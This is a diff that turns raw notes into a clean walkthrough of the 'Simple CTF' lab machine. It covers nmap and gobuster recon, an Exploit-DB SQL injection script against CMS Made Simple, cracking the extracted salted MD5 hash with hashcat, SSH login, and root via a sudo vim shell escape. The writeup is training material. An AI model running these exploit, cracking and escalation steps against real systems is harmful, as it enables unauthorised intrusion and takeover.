@@ -1,223 +1,59 @@
-nmap
+================================================================================
+CTF WRITEUP: SIMPLE CTF (CMS Made Simple)
+Target IP: 10.10.146.19
+================================================================================
 
-nmap -sC -sV -p 22,80,1000,2222 10.10.146.19
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 16:40 -04
-Nmap scan report for 10.10.146.19
-Host is up (0.15s latency).
+1. ENUMERATION & RECON
+--------------------------------------------------------------------------------
+Command: nmap -sC -sV -p 22,80,1000,2222 10.10.146.19
+Results:
+- 80/tcp   (HTTP) - Apache 2.4.18
+- 2222/tcp (SSH)  - OpenSSH 7.2p2 (Standard SSH moved to non-standard port)
+- 1000/tcp (CADLOCK) - Filtered
 
-PORT     STATE    SERVICE VERSION
-22/tcp   filtered ssh
-80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Apache2 Ubuntu Default Page: It works
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-robots.txt: 2 disallowed entries
-|_/ /openemr-5_0_1_3
-1000/tcp filtered cadlock
-2222/tcp open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
-|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
-|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Web Discovery (Gobuster):
+- /robots.txt : Disallowed entries for /openemr-5_0_1_3.
+- /simple/    : CMS Made Simple installation found.
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
+2. SQL INJECTION (CMS MADE SIMPLE)
+--------------------------------------------------------------------------------
+Vulnerability: CMS Made Simple < 2.2.10 (CVE-2019-9053)
+Exploit: SQL Injection via Exploit-DB (46635.py)
 
+Action: 
+python3 46635.py -u http://10.10.146.19/simple/ -w /usr/share/wordlists/rockyou.txt
 
-escaneo de Puerto 1000
+Extracted Data:
+- Username: mitch
+- Salt: 1dac0d92e9fa6bb2
+- MD5 Hash: 0c01f4468bd75d7a84c7eb73846e8d96
 
-sudo nmap -p 1-1000 -sS <target_IP>
+Cracking the Hash:
+Format: md5($salt.$pass) -> Hashcat Mode 20
+Command: hashcat -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 wordlist.txt
+Result: secret
 
+3. INITIAL ACCESS
+--------------------------------------------------------------------------------
+SSH Login: ssh mitch@10.10.146.19 -p 2222
+Password: secret
+User Flag: Found in user.txt (mitch's home directory).
 
-si sale filtered tiraar eso
+4. PRIVILEGE ESCALATION (GTFOBINS)
+--------------------------------------------------------------------------------
+Checking Sudo: sudo -l
+Result: (root) NOPASSWD: /usr/bin/vim
 
-en lo contrario
+Exploitation:
+Vim allows shell execution from within the editor. Since it can be run as 
+sudo, the spawned shell will be root.
 
-sudo nmap -p 1000 -sS <target_IP>
-
-
-gobuster 
-
- gobuster dir -u http://10.10.146.19 -w /usr/SecLists/Discovery/Web-Content/common.txt
-===============================================================
-Gobuster v3.8
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.146.19
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/SecLists/Discovery/Web-Content/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/.htpasswd            (Status: 403) [Size: 296]
-/.htaccess            (Status: 403) [Size: 296]
-/.hta                 (Status: 403) [Size: 291]
-/index.html           (Status: 200) [Size: 11321]
-/robots.txt           (Status: 200) [Size: 929]
-/server-status        (Status: 403) [Size: 300]
-/simple               (Status: 301) [Size: 313] [--> http://10.10.146.19/simple/]
-Progress: 4750 / 4750 (100.00%)
-===============================================================
-Finished
-===============================================================
-
-
-CVE-2019-9053 vulnerability 
-
-exploit db
-
-CMS Made Simple < 2.2.10 - SQL Injection 
-
-
-download .py file
-
- python3 46635.py -u http://10.10.146.19/simple/ -w /usr/SecLists/Passwords/Common-Credentials/
-best110.txt
-
-
-results?
-
-[+] Salt for password found: 1dac0d92e9fa6bb2
-[+] Username found: mitch
-[+] Email found: admin@admin.com
-[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
-
-echo 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 > sqli.txt
-
-hashcat sqli.txt /usr/SecLists/Passwords/Common-Credentials/best110.txt
-hashcat (v6.2.6) starting in autodetect mode
-
-OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* 
-
-The following 20 hash-modes match the structure of your input hash:
-
-      # | Name                                                       | Category
-  ======+============================================================+======================================
-     10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
-     20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
-   3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
-   3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
-   4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
-   4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
-  21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
-     40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
-   3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
-   4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
-  21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
-     30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
-     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
-     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
-   1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
-     12 | PostgreSQL                                                 | Database Server
-   2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
-   2611 | vBulletin < v3.8.5                                         | Forums, CMS, E-Commerce
-   2711 | vBulletin >= v3.8.5                                        | Forums, CMS, E-Commerce
-     23 | Skype                                                      | Instant Messaging Service
-
-Please specify the hash-mode with -m [hash-mode].
-
-Started: Fri Oct  3 18:37:57 2025
-Stopped: Fri Oct  3 18:37:59 2025
-
-┌──(root㉿LEVOw0rld)-[/home/kupito]
-└─# hashcat sqli.txt /usr/SecLists/Passwords/Common-Credentials/best110.txt -m 20
-hashcat (v6.2.6) starting
-
-\OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* U
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-Minimim salt length supported by kernel: 0
-Maximum salt length supported by kernel: 256
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Early-Skip
-* Not-Iterated
-* Single-Hash
-* Single-Salt
-* Raw-Hash
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 1 MB
-
-
-Dictionary cache built:
-* Filename..: /usr/SecLists/Passwords/Common-Credentials/best110.txt
-* Passwords.: 110
-* Bytes.....: 849
-* Keyspace..: 110
-* Runtime...: 0 secs
-
-The wordlist or mask that you are using is too small.
-This means that hashcat cannot use the full parallel power of your device(s).
-Unless you supply more work, your cracking speed will drop.
-For tips on supplying more work, see: https://hashcat.net/faq/morework
-
-Approaching final keyspace - workload adjusted.
-
-0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 20 (md5($salt.$pass))
-Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
-Time.Started.....: Fri Oct  3 18:38:32 2025 (0 secs)
-Time.Estimated...: Fri Oct  3 18:38:32 2025 (0 secs)
-Kernel.Feature...: Pure Kernel
-Guess.Base.......: File (/usr/SecLists/Passwords/Common-Credentials/best110.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:     2602 H/s (0.05ms) @ Accel:256 Loops:1 Thr:1 Vec:8
-Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
-Progress.........: 110/110 (100.00%)
-Rejected.........: 0/110 (0.00%)
-Restore.Point....: 0/110 (0.00%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidate.Engine.: Device Generator
-Candidates.#1....: 000000 -> zxczxc
-Hardware.Mon.#1..: Util:  8%
-
-Started: Fri Oct  3 18:38:15 2025
-Stopped: Fri Oct  3 18:38:33 2025
-
-
-found password: secret
+Command: sudo vim -c ':!/bin/sh'
 
 
 
-IMPORTANTTTT sudo -l para saber que corer sin sudo
-
-/usr/bin/vim
-
-gtfobins
-
-vim - sudo
-
-sudo vim -c ':!/bin/sh'
- 
-
-id - root
-
-cd /root
-
-cat  root.txt
-
-W3ll d0n3. You made it!
+5. FINAL FLAGS
+--------------------------------------------------------------------------------
+Verification: id -> uid=0(root)
+[ROOT] cat /root/root.txt -> "W3ll d0n3. You made it!"
+================================================================================
